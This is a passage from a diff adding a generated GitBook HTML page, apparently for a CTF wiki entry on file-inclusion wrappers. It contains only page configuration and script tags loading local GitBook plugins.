CTFS-WiKi"},"links":{"sidebar":{"Home":"http://sstrunk.com"},"gitbook":false,"sharing":{"all":false,"vk":false,"facebook":true,"twitter":true,"google":true,"weibo":true}},"gitbook":"*"},"file":{"path":"FI/wrappers.md","mtime":"2017-12-26T08:05:53.382Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2017-12-27T07:03:32.475Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-expandable-chapters-small/expandable-chapters-small.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
